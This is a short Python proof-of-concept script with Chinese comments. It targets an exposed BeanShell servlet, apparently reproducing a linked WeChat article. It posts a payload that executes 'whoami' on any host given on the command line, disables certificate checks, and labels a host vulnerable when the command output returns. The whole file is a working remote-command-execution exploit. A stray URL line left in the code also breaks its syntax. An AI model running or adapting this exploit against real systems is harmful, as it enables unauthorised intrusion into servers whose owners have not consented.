#conding=utf-8
import requests #用于http请求响应
from requests.packages import urllib3
import sys

'''
使用方法：
python POC.py URL
'''

https://mp.weixin.qq.com/s/9xLQ1YAWVtHBv9qVk-Xc1A
复现文章

#消除安全请求的提示信息,增加重试连接次数
urllib3.disable_warnings()
requests.adapters.DEFAULT_RETRIES = 1
s = requests.session()

#HTTP请求-head头
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Content-Type': 'application/x-www-form-urlencoded',
}

def POC(url):
    target = url + '/../'
    payload = 'bsh.script=exec(%22whoami%22)&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
    try:
        resp = s.get(target,verify=False,headers=headers,timeout=8)#忽略了SSL验证
        if (resp.status_code ==200 and ("访问禁止" not in resp.text)):
            resp = s.post(url=target, verify=False, data=payload, headers=headers, timeout=8)
            resp.encoding = resp.apparent_encoding  #指定编码，防止乱码
            #apparent_encoding会从网页的内容中分析网页编码的方式

            rs_len = len(resp.text)
            if rs_len < 50:
                success = "|目标存在漏洞| "+url+" "+resp.text
                print(success.strip())
                resp.close() #关闭响应包
            else:
                resp.close() #关闭响应包
                print("|无漏洞| "+url)              
        else:
            print("|无漏洞| "+url)

    except Exception as ex_poc:
        msg = url+"=====报错了====="+str(ex_poc)
        print(msg)


def H2U():
    '''输入格式处理，将HOST统一为URL格式'''
    try:
        host = sys.argv[1]
        if(host[0:4]=="http"):
            url=host
        else:
            url="http://"+host
        POC(url)
    except Exception as ex:
        print(str(ex))


if __name__ == "__main__":
    H2U()